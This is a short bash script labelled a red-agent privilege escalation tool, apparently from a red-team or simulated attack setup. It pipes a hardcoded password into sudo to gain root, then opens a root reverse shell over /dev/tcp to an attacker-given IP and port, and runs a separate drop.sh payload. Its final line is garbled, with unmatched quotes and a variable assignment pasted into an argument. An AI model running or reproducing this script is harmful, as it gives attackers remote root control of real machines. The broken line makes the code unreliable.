#!/bin/bash

# Red Agent Privilege Escalation Script that invokes drop.sh

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <attacker-ip> <attacker-port>"
    echo "Example: $0 10.0.0.1 4445"
    exit 1
fi

attacker_ip=$1
attacker_port=$2

echo "[*] Attempting privilege escalation..."

# Attempt privilege escalation with known password
if printf '1234\n' | sudo -S whoami 2>/dev/null | grep -q root; then
    echo "[+] Privilege escalation successful."

    # Ensure drop.sh is executable


    # printf '1234\n' | sudo -S ./drop.sh

    # Optionally launch reverse shell as root
    echo "[*] Spawning reverse shell to $attacker_ip:$attacker_port ..."
    printf '1234\n' | sudo -S /bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"
else
    echo "[!] Privilege escalation failed."
fi

chmod +x drop.sh

RAND_FILE="drop_$(date +%s)_$RANDOM.bin"


./drop.sh "0.8" "RAND_FILE="drop_$(date +%s)_$RANDOM.bin" 